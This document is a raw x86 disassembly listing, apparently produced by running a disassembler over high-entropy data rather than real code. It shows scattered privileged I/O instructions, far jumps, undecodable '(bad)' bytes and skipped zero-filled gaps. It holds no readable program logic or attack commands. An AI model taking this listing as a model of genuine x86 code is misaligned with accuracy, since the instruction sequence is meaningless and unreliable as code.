  422c3f:	pop    edx
  422c40:	xor    bl,BYTE PTR [ebx]
  422c42:	push   cs
  422c43:	jle    0x422c64
  422c45:	jge    0x422bf2
  422c47:	ror    DWORD PTR [ecx-0x6e0e040b],cl
  422c4d:	in     al,dx
  422c4e:	xor    ebx,esp
  422c50:	jae    0x422c63
  422c52:	popf   
  422c53:	sub    DWORD PTR [ecx+0x3ca6842b],ebp
  422c59:	rcl    ebx,1
  422c5b:	shl    edi,1
  422c5d:	jno    0x422c47
  422c5f:	add    BYTE PTR [esi-0x2],0x4c
  422c63:	call   0x985a:0x8ad3814b
  422c6a:	push   eax
  422c6b:	sub    esp,DWORD PTR [esp+edi*4]
  422c6e:	dec    esi
  422c6f:	rol    BYTE PTR [ebx-0x4c16b0b5],0xc2
  422c76:	or     DWORD PTR ds:0x54ed9213,0xa5a4d0f3
  422c80:	sbb    eax,0x1289cd6d
  422c85:	add    ecx,DWORD PTR [ebp-0x29]
  422c88:	aad    0x41
  422c8a:	rcl    BYTE PTR [edx],1
  422c8c:	fs add eax,0x68cdb071
  422c92:	jle    0x422c26
  422c94:	mov    esp,0xd4d28677
  422c99:	sbb    ecx,DWORD PTR [edi-0x7cc199d5]
  422c9f:	bound  esi,QWORD PTR [edi+0xb]
  422ca2:	sar    DWORD PTR [edx-0x31609a83],1
  422ca8:	daa    
  422ca9:	and    eax,0x395050b6
  422cae:	add    DWORD PTR [esi-0x4e],ebp
  422cb1:	int3   
  422cb2:	adc    esi,eax
  422cb4:	mov    eax,0x1847be83
  422cb9:	mov    bh,0x44
  422cbb:	test   DWORD PTR [ecx+0x102c01d6],0x615e2c9b
  422cc5:	or     eax,0x59f0ce3b
  422cca:	cmc    
  422ccb:	or     DWORD PTR [ebp-0x3f],0xffffffb3
  422ccf:	xchg   edx,eax
  422cd0:	jae    0x422d2c
  422cd2:	mov    dh,0x1e
  422cd4:	jae    0x422cab
  422cd6:	xlat   BYTE PTR ds:[ebx]
  422cd7:	inc    eax
  422cd8:	stc    
  422cd9:	loope  0x422c60
  422cdb:	cmp    edi,esp
  422cdd:	jecxz  0x422d01
  422cdf:	gs retf 
  422ce1:	mov    WORD PTR [esi],es
  422ce3:	cmp    eax,0xcba9e671
  422ce8:	dec    ebx
  422ce9:	jmp    0x28890386
  422cee:	not    DWORD PTR fs:[ebp+0x6a]
  422cf2:	loop   0x422d1a
  422cf4:	aam    0x92
  422cf6:	adc    edi,DWORD PTR [ecx]
  422cf8:	sbb    BYTE PTR [ecx],al
  422cfa:	sub    edx,esp
  422cfc:	outs   dx,DWORD PTR ds:[esi]
  422cfd:	inc    eax
  422cfe:	xchg   edx,eax
  422cff:	fstp   TBYTE PTR [ebx-0x69e34de7]
  422d05:	jmp    0x47f:0xb938d8f8
  422d0c:	xor    eax,0x1012169e
	...
  422d71:	add    BYTE PTR [eax],al
  422d73:	add    BYTE PTR [edi+0x626d60bd],bh
  422d79:	std    
  422d7a:	mov    edi,0x80797fff
  422d7f:	sub    esp,ecx
  422d81:	jne    0x422d0f
  422d83:	push   esp
  422d84:	div    DWORD PTR [ebx+0x1]
  422d87:	add    BYTE PTR ds:0x8a000001,al
  422d8d:	mul    BYTE PTR ds:0xfac7ca61
  422d93:	loop   0x422de5
  422d95:	rcr    dl,0x12
  422d98:	pop    ss
  422d99:	and    eax,0x8112b021
  422d9e:	push   ecx
  422d9f:	std    
  422da0:	ins    BYTE PTR es:[edi],dx
  422da1:	cs jge 0x422d91
  422da4:	inc    eax
  422da5:	(bad)  
  422da6:	jmp    0xb2bcd16f
  422dab:	dec    edi
  422dac:	rcl    DWORD PTR [ebx+ebx*8],cl
  422daf:	bound  ebx,QWORD PTR [edi+0x3d]
  422db2:	mov    ah,0x52
  422db4:	mov    edi,0xf128ee6b
  422db9:	jecxz  0x422d4f
  422dbb:	pop    ebx
  422dbc:	jne    0x422d5c
  422dbe:	repz scas eax,DWORD PTR es:[edi]
  422dc0:	mov    dh,0x11
  422dc2:	sub    eax,0x70d43e59
  422dc7:	sahf   
  422dc8:	jmp    0x422db8
  422dca:	sub    eax,0x7789c20a
  422dcf:	sbb    eax,0xcc656948
  422dd4:	mov    ebx,0x98749c35
  422dd9:	or     ah,BYTE PTR [esi+0x34a6c67a]
  422ddf:	mov    ah,0x3a
  422de1:	fucomi st,st(7)
  422de3:	lods   al,BYTE PTR ds:[esi]
  422de4:	inc    ebp
  422de5:	imul   esp,DWORD PTR [ecx-0x4],0x1
  422de9:	push   ebx
  422dea:	mov    WORD PTR [ebx-0x270cace5],ds
  422df0:	sbb    BYTE PTR [esp+eax*2+0x82742d1],cl
  422df7:	shl    ebx,cl
  422df9:	cmp    DWORD PTR [eax+ebp*2],0x65d304e
  422e00:	out    0x8d,al
  422e02:	in     eax,dx
  422e03:	or     al,0x26
  422e05:	sub    al,BYTE PTR [ebx+ebx*4]
  422e08:	jmp    0x3a07:0x31f92478
  422e0f:	sbb    eax,0x28959945
  422e14:	pop    ecx
  422e15:	jb     0x422e49
  422e17:	(bad)  
  422e18:	jne    0x422e0d
  422e1a:	dec    ecx
  422e1b:	sub    eax,0xeb83f3c9
  422e20:	pop    edi
  422e21:	out    dx,al
  422e22:	loope  0x422ddf
  422e24:	cmp    ebp,DWORD PTR ds:0x1f02bb21
  422e2a:	mov    al,ds:0x9c1e838f
  422e2f:	test   DWORD PTR [ebp-0x43325cc5],0x1379de5a
  422e39:	xlat   BYTE PTR ds:[ebx]
  422e3a:	ds push esp
  422e3c:	lds    edx,FWORD PTR [ebx]
  422e3e:	jae    0x422eaf
  422e40:	push   ds
  422e41:	into   
  422e42:	xor    edi,DWORD PTR [ebp+0x7fabd3]
  422e48:	iret   
  422e49:	adc    al,0x9a
  422e4b:	cld    
  422e4c:	cs push ebp
  422e4e:	enter  0xd11,0xa8
  422e52:	(bad)  
  422e53:	mov    esi,0xe2f2527
  422e58:	push   0xffffffe6
  422e5a:	and    ah,dl
  422e5c:	sahf   
  422e5d:	xor    al,0x72
  422e5f:	aam    0xcb
  422e61:	les    edx,FWORD PTR fs:[edx*2-0x7360be9f]
  422e69:	cdq    
  422e6a:	(bad)  
  422e6b:	adc    eax,0x6ab85fdb
  422e70:	imul   ecx,DWORD PTR [esi],0xffffff89
  422e73:	sahf   
  422e74:	div    BYTE PTR ds:0x374d19d0
  422e7a:	ret    
  422e7b:	(bad)  
  422e7d:	mov    edi,0x8659cc23
  422e82:	lea    ebp,[edx+0x459157e1]
  422e88:	(bad)  
  422e89:	retf   0xaee5
  422e8c:	lahf   
  422e8d:	xchg   ecx,eax
  422e8e:	nop
  422e8f:	dec    ebx
  422e90:	lods   eax,DWORD PTR ds:[esi]
	...
  422ef1:	add    BYTE PTR [eax],al
  422ef3:	add    BYTE PTR [ebx-0x21e677ab],al
  422ef9:	fst    QWORD PTR [ebx+0x33b808df]
  422eff:	retf   0xbebe
  422f02:	xchg   esi,eax
  422f03:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f04:	cld    
  422f05:	je     0x422f08
  422f07:	add    BYTE PTR ds:0x7a000001,al
  422f0d:	and    ebp,DWORD PTR [ecx+0x77]
  422f10:	xor    BYTE PTR [ebx],al
  422f12:	jae    0x422ee4
  422f14:	sub    al,0xef
  422f16:	xor    cl,0xf0
  422f19:	in     al,0xee
  422f1b:	frndint 
  422f1d:	pusha  
  422f1e:	adc    ebp,DWORD PTR [eax+ebp*8-0x3624671e]
  422f25:	mov    eax,ds:0xdb0a617e
  422f2a:	aam    0x68
  422f2c:	adc    DWORD PTR [ebp+0x74ac39bf],0x540c38bb
  422f36:	imul   edx,DWORD PTR [ecx],0x63ecd44a
  422f3c:	sub    BYTE PTR [ebp-0x6d671d26],bl
  422f42:	xchg   DWORD PTR [eax+0x15dd5e82],edi
  422f48:	lods   eax,DWORD PTR ds:[esi]
  422f49:	shl    BYTE PTR [ebx+ecx*2-0xf],0x7f
  422f4e:	scas   al,BYTE PTR es:[edi]
  422f4f:	stos   DWORD PTR es:[edi],eax
  422f50:	mov    eax,ds:0x61f2f881
  422f55:	xor    BYTE PTR [ebx-0x59],ah
  422f58:	jno    0x422f33
  422f5a:	xchg   esp,eax
  422f5b:	xor    ecx,esp
  422f5d:	mov    edx,0xeaad38b3
  422f62:	call   0x2f55ac36
  422f67:	js     0x422fbc
  422f69:	rol    ecx,1
  422f6b:	adc    dh,bh
  422f6d:	mov    bl,0x52
  422f6f:	shl    eax,cl
  422f71:	add    BYTE PTR [ecx],bh
  422f73:	bound  edi,QWORD PTR [edx]
  422f75:	sub    dh,cl
  422f77:	aaa    
  422f78:	push   edi
  422f79:	jnp    0x422efe
  422f7b:	mov    ebp,0x309b574b
  422f80:	cld    
  422f81:	mov    esi,0x4c655d8a
  422f86:	adc    al,0xfb
  422f88:	loope  0x422fb5
  422f8a:	inc    edi
  422f8b:	in     eax,dx
  422f8c:	jbe    0x422fbb
  422f8e:	hlt    
  422f8f:	xlat   BYTE PTR ds:[ebx]
  422f90:	stc    
  422f91:	gs int 0xc6
  422f94:	cmp    ch,BYTE PTR [ecx+0x21b2d0f1]
  422f9a:	mov    edx,DWORD PTR [ebx-0x50]
  422f9d:	mov    edx,0xf884b32c
  422fa2:	lods   al,BYTE PTR ds:[esi]
  422fa3:	cmp    al,0x9f
  422fa5:	push   0x6d773fb6
  422faa:	cmp    DWORD PTR es:[eax+edi*2-0x3c7a2069],ebp
  422fb2:	and    edx,ebx
  422fb4:	aam    0xda
  422fb6:	jle    0x422f70
  422fb8:	push   cs
  422fb9:	dec    esi
  422fba:	call   0xd271:0x99f24937
  422fc1:	jno    0x422fe6
  422fc3:	aam    0xcc
  422fc5:	push   ebp
  422fc6:	add    edx,ebx
  422fc8:	xchg   edx,eax
  422fc9:	fcmovne st,st(2)
  422fcb:	mov    edx,DWORD PTR [esp+edi*2-0x55]
  422fcf:	bound  edi,QWORD PTR [edi+ecx*1-0x7436242f]
  422fd6:	pxor   mm0,QWORD PTR ds:0xf4b8d0ed
  422fdd:	nop
  422fde:	popf   
  422fdf:	ins    DWORD PTR es:[edi],dx
  422fe0:	gs push ebx
  422fe2:	mov    eax,0xa226ef7a
  422fe7:	cld    
  422fe8:	call   0xb5907a57
  422fed:	jb     0x422fe1
  422fef:	pop    esi
  422ff0:	js     0x422fa1
  422ff2:	sahf   
  422ff3:	adc    DWORD PTR [edi-0x6b8fd58],edx
  422ff9:	or     eax,0xbb590985
  422fff:	pcmpgtd mm4,QWORD PTR [edx-0x2]
  423003:	push   esi
  423004:	(bad)  
  423005:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423006:	popf   
  423007:	jmp    0x422fd7
  423009:	hlt    
  42300a:	les    ebx,FWORD PTR [edx+0x57e0e8ba]
  423010:	mov    esi,0x0
	...
  423071:	add    BYTE PTR [eax],al
  423073:	add    BYTE PTR [esi-0x1c],al
  423076:	bound  ecx,QWORD PTR [eax-0x1111711e]
  42307c:	sub    ecx,ebx
  42307e:	sbb    DWORD PTR [ecx+edx*8+0x15bf958],esp
  423085:	jbe    0x423088
  423087:	add    BYTE PTR ds:0xda000001,al
  42308d:	jno    0x423032
  42308f:	jo     0x4230f4
  423091:	and    al,0x5d
  423093:	xchg   edx,eax
  423094:	out    0xa4,al
  423096:	cmp    edi,DWORD PTR [ebx-0x75]
  423099:	ret    0x25dc
  42309c:	jne    0x4230e5
  42309e:	enter  0x4716,0x98
  4230a2:	mov    ah,0x89
  4230a4:	cmp    esi,esi
  4230a6:	adc    dl,BYTE PTR [edx+0x4b]
  4230a9:	aam    0xcc
  4230ab:	adc    al,0x44
  4230ad:	fs in  al,0x43
  4230b0:	push   cs
  4230b1:	lock cli 
  4230b3:	aas    
  4230b4:	aas    
  4230b5:	out    0xbc,al
  4230b7:	sbb    eax,0x4a08e172
  4230bc:	add    eax,0x2f9f5c31
  4230c1:	hlt    
  4230c2:	rol    DWORD PTR [ecx-0x5b],0x1
  4230c6:	bound  ebp,QWORD PTR [esi-0x6b]
  4230c9:	test   eax,0x414e070e
  4230ce:	out    0xbc,eax
  4230d0:	mov    DWORD PTR [eax+0x27],ebp
  4230d3:	cdq    
  4230d4:	(bad)  
  4230d5:	xor    BYTE PTR [eax-0x55],ah
  4230d8:	jmp    0x86cf375
  4230dd:	jns    0x423135
  4230df:	add    al,0x1a
  4230e1:	dec    ebx
  4230e2:	rcr    DWORD PTR [esi+0x46],0x7f
  4230e6:	pop    sp
  4230e8:	loopne 0x423079
  4230ea:	mov    bx,0xa3f1
  4230ee:	pushf  
  4230ef:	xchg   ebp,eax
  4230f0:	leave  
  4230f1:	xchg   ebp,eax
  4230f2:	std    
  4230f3:	cmp    al,al
  4230f5:	fidivr WORD PTR [edi+0x5eec8159]
  4230fb:	mov    esp,0x132f444c
  423100:	cmp    al,0x4e
  423102:	xchg   esi,eax
  423103:	outs   dx,BYTE PTR ds:[esi]
  423104:	sbb    BYTE PTR [edx-0x13],dh
  423107:	(bad)  
  423108:	inc    esp
  423109:	(bad)  
  42310a:	loop   0x4230f3
  42310c:	lds    esp,FWORD PTR [ecx]
  42310e:	js     0x4230e8
  423110:	pop    esi
  423111:	jno    0x423122
  423113:	cwde   
  423114:	cmp    eax,0x1bd532f4
  423119:	cmp    edi,DWORD PTR [edx+ecx*1+0x25]
  42311d:	xor    esp,edi
  42311f:	sub    bl,bh
  423121:	call   0xc4bb1b8b
  423126:	push   ss
  423127:	and    eax,0x51b4727e
  42312c:	push   ecx
  42312d:	fcom   QWORD PTR [ecx+0x51]
  423130:	xchg   BYTE PTR [edx+0x41490848],bl
  423136:	mul    BYTE PTR [edi-0x74ce2d4d]
  42313c:	(bad)  
  42313d:	sub    eax,0xd20cd648
  423142:	inc    esp
  423143:	scas   eax,DWORD PTR es:[edi]
  423144:	in     eax,0xa3
  423146:	mov    ebp,0xd16fd182
  42314b:	cmp    ch,BYTE PTR cs:[ebx+0x3e36ea02]
  423152:	adc    eax,0x715da398
  423157:	fsubr  st,st(5)
  423159:	es dec edi
  42315b:	mov    dl,0x62
  42315d:	ins    BYTE PTR es:[edi],dx
  42315e:	aas    
  42315f:	and    eax,0x850997f5
  423164:	jge    0x42313d
  423166:	or     al,bh
  423168:	cli    
  423169:	nop
  42316a:	sbb    BYTE PTR [esp+edx*1-0x647ab3fb],dl
  423171:	loopne 0x42312e
  423173:	mov    ch,0x2d
  423175:	fist   DWORD PTR [ebx+0x2a77d360]
  42317b:	sub    al,BYTE PTR [ecx]
  42317d:	retf   0xcc53
  423180:	mov    esp,ebx
  423182:	stos   BYTE PTR es:[edi],al
  423183:	outs   dx,BYTE PTR ds:[esi]
  423184:	dec    edi
  423185:	daa    
  423186:	cs jp  0x423175
  423189:	or     BYTE PTR [ebx],al
  42318b:	popa   
  42318c:	rcr    ebx,1
  42318e:	jmp    0x42f2aa
	...
  4231f3:	add    BYTE PTR [ecx-0xf],bh
  4231f6:	div    DWORD PTR [ecx-0x6804801]
  4231fc:	in     al,0xe0
  4231fe:	sub    DWORD PTR [edx-0x7b37b2f5],esp
  423204:	push   es
  423205:	ja     0x423208
  423207:	add    BYTE PTR ds:0xe7000001,al
  42320d:	and    bl,ch
  42320f:	dec    esi
  423210:	pop    ebp
  423211:	ret    0x3a19
  423214:	push   ds
  423215:	jecxz  0x4231b7
  423217:	(bad)  [eax-0x5e762f19]
  42321d:	stos   BYTE PTR es:[edi],al
  42321e:	xchg   ebp,eax
  42321f:	pushf  
  423220:	mov    WORD PTR [ecx+0x3e],gs
  423223:	shl    WORD PTR [ebx+0x5c],cl
  423227:	sub    BYTE PTR [edi-0x586572cf],0xf0
  42322e:	loop   0x4231b6
  423230:	cdq    
  423231:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423232:	clc    
  423233:	lea    ebx,[ebx]
  423235:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423236:	mov    cl,0xf
  423238:	xchg   esi,eax
  423239:	daa    
  42323a:	mov    ss:0x27714746,eax
  423240:	dec    esp
  423241:	pop    esi
  423242:	pop    ds
  423243:	jmp    DWORD PTR ds:0xeb0a4c25
  423249:	(bad)  
  42324b:	adc    edx,DWORD PTR [esi]
  42324d:	xchg   bl,dh
  42324f:	test   al,0xf8
  423251:	cmc    
  423252:	or     esi,edx
  423254:	xchg   esp,eax
  423255:	mov    ch,0xe2
  423257:	xchg   esi,eax
  423258:	retf   0xbf2a
  42325b:	add    DWORD PTR [edx-0x142325a7],edx
  423261:	mov    esp,0xb971a1e3
  423266:	sti    
  423267:	mov    esi,0x3574744b
  42326c:	push   eax
  42326d:	test   eax,0x6af61cd2
  423272:	jle    0x423283
  423274:	mov    ebp,edx
  423276:	cmp    BYTE PTR [edx+0x24],ah
  423279:	jl     0x4232f8
  42327b:	mov    ecx,0xdfaafb8d
  423280:	loopne 0x4232c8
  423282:	jge    0x423222
  423284:	xchg   ebx,eax
  423285:	fwait
  423286:	stc    
  423287:	ficom  DWORD PTR [ebp+0x3c91fbe0]
  42328d:	jmp    0xb7a1827a
  423292:	add    BYTE PTR [ebp+0x7],al
  423295:	adc    al,0xd
  423297:	push   eax
  423298:	cmp    al,0x79
  42329a:	jo     0x4232b0
  42329c:	aam    0xbd
  42329e:	popf   
  42329f:	fst    QWORD PTR [edx-0x78]
  4232a2:	in     al,dx
  4232a3:	push   ecx
  4232a4:	mov    esp,edx
  4232a6:	fimul  WORD PTR [edx+0x41]
  4232a9:	pop    es
  4232aa:	call   0x5cf2b265
  4232af:	ss push 0x7f
  4232b2:	inc    ecx
  4232b3:	rol    BYTE PTR [edx],0xae
  4232b6:	push   esi
  4232b7:	(bad)  
  4232b8:	idiv   BYTE PTR [esi]
  4232ba:	mov    eax,0xbcf61270
  4232bf:	fistp  DWORD PTR [esi]
  4232c1:	sbb    al,0x54
  4232c3:	fs jl  0x42324d
  4232c6:	addr16 int3 
  4232c8:	mov    bl,0x47
  4232ca:	ja     0x4232f1
  4232cc:	mov    ecx,0x381ebf15
  4232d1:	lock cs jl 0x4232a6
  4232d5:	jae    0x423260
  4232d7:	clc    
  4232d8:	loope  0x423296
  4232da:	ror    DWORD PTR [ecx+edx*4-0x31d74dd7],cl
  4232e1:	cmc    
  4232e2:	ss data16 clc 
  4232e5:	mov    ecx,?
  4232e7:	cdq    
  4232e8:	mov    dh,0x7
  4232ea:	or     esp,DWORD PTR [ebx-0x51d32058]
  4232f0:	or     ch,BYTE PTR [ebp-0x10]
  4232f3:	leave  
  4232f4:	pop    ecx
  4232f5:	and    DWORD PTR [ecx-0x7393337d],0xcfc2fcd1
  4232ff:	xor    ecx,DWORD PTR [edx+0x10ed791f]
  423305:	cmp    bl,BYTE PTR [esi+0xf92c367]
  42330b:	int    0xf
  42330d:	cld    
  42330e:	inc    edi
  42330f:	push   eax
  423310:	cmc    
	...
  423371:	add    BYTE PTR [eax],al
  423373:	add    al,bh
  423375:	fisub  WORD PTR [edx+0x30]
  423378:	mov    sp,0xdefa
  42337c:	mov    eax,fs:0x4f200f44
  423382:	fsubr  QWORD PTR [ebx]
  423384:	or     edi,DWORD PTR [eax+0x1]
  423387:	add    BYTE PTR ds:0xaa000001,al
  42338d:	xor    eax,0xe3ccd42
  423392:	add    DWORD PTR [ebp+0x787f7f23],edi
  423398:	ret    0x4f36
  42339b:	or     BYTE PTR [edi-0x1c7acb62],dl
  4233a1:	cld    
  4233a2:	popf   
  4233a3:	std    
  4233a4:	jg     0x423381
  4233a6:	dec    edx
  4233a7:	shr    BYTE PTR [eax+0x17],cl
  4233aa:	daa    
  4233ab:	fbstp  TBYTE PTR [edx+0x7d60113b]
  4233b1:	push   ds
  4233b2:	jp     0x423348
  4233b4:	cmp    al,0x60
  4233b6:	lahf   
  4233b7:	in     eax,dx
  4233b8:	sbb    DWORD PTR [esi-0x1],ebx
  4233bb:	and    al,0x71
  4233bd:	outs   dx,BYTE PTR ds:[esi]
  4233be:	cld    
  4233bf:	cmp    DWORD PTR [edi],edi
  4233c1:	ins    DWORD PTR es:[edi],dx
  4233c2:	imul   eax,DWORD PTR [edi-0x77f4e821],0x31
  4233c9:	sbb    al,cl
  4233cb:	lea    ecx,ds:0xe89e3d1a
  4233d1:	(bad)  [ebp-0x79]
  4233d4:	ss out 0x2b,eax
  4233d7:	loop   0x4233be
  4233d9:	dec    esi
  4233da:	retf   0x4c13
  4233dd:	into   
  4233de:	pop    ebx
  4233df:	ror    DWORD PTR [eax-0x76252c6e],0xdd
  4233e6:	sub    BYTE PTR [ebx-0x29],0x70
  4233ea:	es sub ebx,ebp
  4233ed:	lock xor ecx,DWORD PTR [eax-0x2c]
  4233f1:	or     cx,WORD PTR ds:0x58ea20dc
  4233f8:	push   esi
  4233f9:	lds    esi,FWORD PTR [edx]
  4233fb:	mov    ds:0x407b2c09,al
  423400:	cmp    bl,BYTE PTR [esi+ebp*4-0x34bdf392]
  423407:	cmp    BYTE PTR [ebx],ch
  423409:	push   ebp
  42340a:	out    0xd2,al
  42340c:	sahf   
  42340d:	push   0xffffffcc
  42340f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423410:	pop    esi
  423411:	(bad)
  423415:	mov    fs,WORD PTR [eax-0x7648f2c4]
  42341b:	xchg   edx,eax
  42341c:	jle    0x4233ef
  42341e:	inc    ebp
  42341f:	fldcw  WORD PTR [edx+ebx*2]
  423422:	lds    edi,FWORD PTR ds:0x75ddbb7e
  423428:	out    dx,al
  423429:	add    eax,0xdd566ef0
  42342e:	mov    ch,0xee
  423430:	dec    BYTE PTR [esi]
  423432:	jmp    0xcb08:0x1e6d8adc
  423439:	ror    BYTE PTR [edx+ebx*2-0x5eb45959],1
  423440:	popa   
  423441:	retf   
  423442:	push   ss
  423443:	mov    al,ah
  423445:	push   ds
  423446:	push   0xecef8330
  42344b:	iret   
  42344c:	cli    
  42344d:	and    dh,ch
  42344f:	xor    dh,BYTE PTR [ecx-0x4ac7f056]
  423455:	fst    DWORD PTR [edi-0x65]
  423458:	pop    ecx
  423459:	xor    DWORD PTR [edx-0x2e4b5a5e],edi
  42345f:	mov    al,ds:0x1c7adabc
  423464:	(bad)  
  423466:	fild   WORD PTR [ecx+0x5874df83]
  42346c:	lock mov cl,0xd6
  42346f:	pop    ebp
  423470:	aad    0xb6
  423472:	inc    ecx
  423473:	xor    ah,dh
  423475:	cmp    eax,DWORD PTR [eax]
  423477:	loop   0x4234b7
  423479:	es mov dh,0xed
  42347c:	adc    al,0xf9
  42347e:	or     BYTE PTR [eax-0xfa687c],bh
  423484:	test   cl,0xb8
  423487:	sbb    ch,dh
  423489:	xchg   esp,eax
  42348a:	rcl    DWORD PTR [edi+0x63],cl
  42348d:	pop    ds
  42348e:	icebp  
  42348f:	dec    ebx
  423490:	or     DWORD PTR [eax],eax
	...
  4234f2:	add    BYTE PTR [eax],al
  4234f4:	shl    BYTE PTR [eax-0x8a90bb],0xea
  4234fb:	mov    edi,0x1fadf467
  423500:	int    0x54
  423502:	call   0x500:0x179108e
  423509:	add    DWORD PTR [eax],eax
  42350b:	add    dl,al
  42350d:	pusha  
  42350e:	xchg   edx,eax
  42350f:	daa    
  423510:	fild   WORD PTR [edx+0x8]
  423513:	jbe    0x4234ad
  423515:	or     eax,0x3df0dce7
  42351a:	and    BYTE PTR [edi-0x65e61f18],ah
  423520:	nop
  423521:	mov    al,ds:0xf4e625da
  423526:	mov    eax,0xe3f9ba2a
  42352b:	jge    0x423553
  42352d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42352e:	test   dh,bh
  423530:	enter  0x3b82,0x81
  423534:	fsub   DWORD PTR [ebp+eiz*1+0x1f]
  423538:	mov    BYTE PTR ss:[edx],dh
  42353b:	imul   ebx,esi,0x4
  42353e:	int    0xef
  423540:	stc    
  423541:	pop    edi
  423542:	fidiv  DWORD PTR [edi-0x3b]
  423545:	push   eax
  423546:	jne    0x423518
  423548:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423549:	ja     0x423566
  42354b:	call   FWORD PTR [ecx+0x45ddbc63]
  423551:	jb     0x42358c
  423553:	pop    ebp
  423554:	in     eax,0x3f
  423556:	test   al,0xeb
  423558:	or     al,0x9d
  42355a:	sbb    BYTE PTR [edi+0xf],bh
  42355d:	push   eax
  42355e:	mov    ebp,0xd83e956e
  423563:	xchg   edx,eax
  423564:	std    
  423565:	mov    bl,BYTE PTR [eax-0x1]
  423568:	in     eax,0x19
  42356a:	jmp    0x2fb2f0e
  42356f:	cmp    ah,BYTE PTR [edi+0x5a]
  423572:	and    DWORD PTR [edx-0x3d],edi
  423575:	xchg   DWORD PTR [esp+eax*1],edx
  423578:	mov    edx,DWORD PTR [ebx+0x16]
  42357b:	push   edi
  42357c:	and    eax,0x1ddccd80
  423581:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423582:	(bad)  
  423584:	lods   eax,DWORD PTR ds:[esi]
  423585:	xchg   ebx,eax
  423586:	fwait
  423587:	mov    ah,0x10
  423589:	mov    edx,0xc3ed0800
  42358e:	fild   QWORD PTR [ecx-0x8]
  423591:	push   esp
  423592:	pop    esi
  423593:	mov    ch,BYTE PTR ds:0xa573c309
  423599:	push   ecx
  42359a:	sqrtps xmm3,XMMWORD PTR [ebp+0x3826296c]
  4235a1:	cdq    
  4235a2:	ror    BYTE PTR [ebx],1
  4235a4:	fidiv  WORD PTR [esi-0x67]
  4235a7:	sbb    cl,cl
  4235a9:	dec    edi
  4235aa:	adc    cl,dl
  4235ac:	jbe    0x4235ce
  4235ae:	rol    BYTE PTR [ebp-0x1fedc766],cl
  4235b4:	dec    esp
  4235b5:	fs push ecx
  4235b7:	pop    esi
  4235b8:	ja     0x423629
  4235ba:	pop    edi
  4235bb:	mov    ebx,0xc4ef005d
  4235c0:	pushf  
  4235c1:	pop    ecx
  4235c2:	push   ecx
  4235c3:	adc    eax,0x714bdfd0
  4235c8:	retf   0x1b1e
  4235cb:	jge    0x4235fd
  4235cd:	pop    ds
  4235ce:	xor    bh,BYTE PTR [esi-0x31ee9e98]
  4235d4:	mov    al,ds:0xd232587e
  4235d9:	or     BYTE PTR [eax-0x469e225b],bh
  4235df:	pusha  
  4235e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4235e1:	stos   DWORD PTR es:[edi],eax
  4235e2:	jo     0x4235e3
  4235e4:	inc    ecx
  4235e5:	arpl   WORD PTR ds:0x2b4a8ec,sp
  4235eb:	repz sub edi,edx
  4235ee:	dec    edx
  4235ef:	adc    DWORD PTR [ecx-0x5576ca03],esi
  4235f5:	call   0x86c7:0x5e23b612
  4235fc:	xchg   edx,eax
  4235fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4235fe:	adc    eax,0x6a570c2a
  423603:	pop    es
  423604:	inc    esi
  423605:	xchg   edi,eax
  423606:	cmp    bh,BYTE PTR [eax-0x69]
  423609:	jmp    0x25102b6e
  42360e:	neg    BYTE PTR [edi]
  423610:	dec    edx
	...
  423671:	add    BYTE PTR [eax],al
  423673:	add    BYTE PTR [eax+0x7f747c8f],al
  423679:	test   DWORD PTR [eax+0x7c916eff],0x3a33a013
  423683:	sub    al,0x15
  423685:	jp     0x423688
  423687:	add    BYTE PTR ds:0x81000001,al
  42368d:	xlat   BYTE PTR ds:[ebx]
  42368e:	mov    al,0x5d
  423690:	cmc    
  423691:	inc    eax
  423692:	mov    DWORD PTR es:0x6c49fe68,ecx
  423699:	adc    al,0x51
  42369b:	pop    ds
  42369c:	dec    ebx
  42369d:	jbe    0x99ae656f
  4236a3:	in     al,0xdd
  4236a5:	mov    DWORD PTR [edi+0x1be11937],ecx
  4236ab:	sbb    al,0x79
  4236ad:	rol    DWORD PTR [ecx+eiz*1+0x10c63739],cl
  4236b4:	mov    esi,0x155674d5
  4236b9:	ret    
  4236ba:	into   
  4236bb:	cmc    
  4236bc:	aaa    
  4236bd:	pop    ds
  4236be:	and    al,0x75
  4236c0:	or     bl,BYTE PTR ds:[edi+edx*1]
  4236c4:	sub    dh,0xf0
  4236c7:	push   edi
  4236c8:	pop    ds
  4236c9:	outs   dx,DWORD PTR ds:[esi]
  4236ca:	xchg   edi,eax
  4236cb:	pop    ecx
  4236cc:	add    DWORD PTR [edx-0x58],esi
  4236cf:	retfw  
  4236d1:	ins    DWORD PTR es:[edi],dx
  4236d2:	loop   0x423730
  4236d4:	xchg   ebp,eax
  4236d5:	mov    esi,0xbd23c0c8
  4236da:	imul   ecx,ebx,0xe4a3f2ad
  4236e0:	aas    
  4236e1:	jecxz  0x423745
  4236e3:	or     al,0x45
  4236e5:	and    dl,BYTE PTR [esi+eax*8-0x72]
  4236e9:	xchg   ebp,eax
  4236ea:	sub    BYTE PTR [edx-0x33],cl
  4236ed:	imul   edi,eax,0x8dcdb906
  4236f3:	imul   ebp,DWORD PTR [ecx],0xffffff82
  4236f6:	(bad)  
  4236f7:	out    dx,al
  4236f8:	push   ds
  4236f9:	sbb    ah,ah
  4236fb:	mov    DWORD PTR [esi-0x7884f208],eax
  423701:	or     BYTE PTR [eax-0x5de26576],bl
  423707:	and    BYTE PTR [esi-0x460f305d],ah
  42370d:	or     DWORD PTR [ebx*4-0x654ce81c],0x36699059
  423718:	clc    
  423719:	outs   dx,DWORD PTR ds:[esi]
  42371a:	je     0x4236c0
  42371c:	call   0xf46b:0xbd4008d9
  423723:	mov    ch,0xd6
  423725:	imul   edx,DWORD PTR [ebp+0x113810a7],0xffffffb2
  42372c:	stos   BYTE PTR es:[edi],al
  42372d:	cmc    
  42372e:	sub    DWORD PTR [ebp+0x24a49b46],ebx
  423734:	xchg   ecx,eax
  423735:	add    al,0x47
  423737:	pop    es
  423738:	push   ds
  423739:	dec    ebp
  42373a:	adc    ebp,eax
  42373c:	push   edx
